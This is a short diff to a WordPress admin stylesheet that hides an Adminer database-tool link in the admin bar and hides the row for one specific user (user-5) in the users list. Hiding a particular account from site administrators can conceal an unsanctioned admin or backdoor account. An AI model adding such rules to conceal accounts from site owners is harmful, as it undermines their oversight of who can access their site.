@@ -4,7 +4,8 @@
 
 #wpadminbar #wp-admin-bar-wp-logo,
 #wpadminbar #wp-admin-bar-comments,
-#wpadminbar #wp-admin-bar-new-content {
+#wpadminbar #wp-admin-bar-new-content,
+#wpadminbar #wp-admin-bar-wp_adminer {
   display: none;
 }
 
@@ -22,5 +23,9 @@
 }
 
 #contextual-help-link-wrap {
+  display: none;
+}
+
+table.table-view-list.users tr#user-5 {
   display: none;
 }/*# sourceMappingURL=admin-style-restrict-ui.css.map */
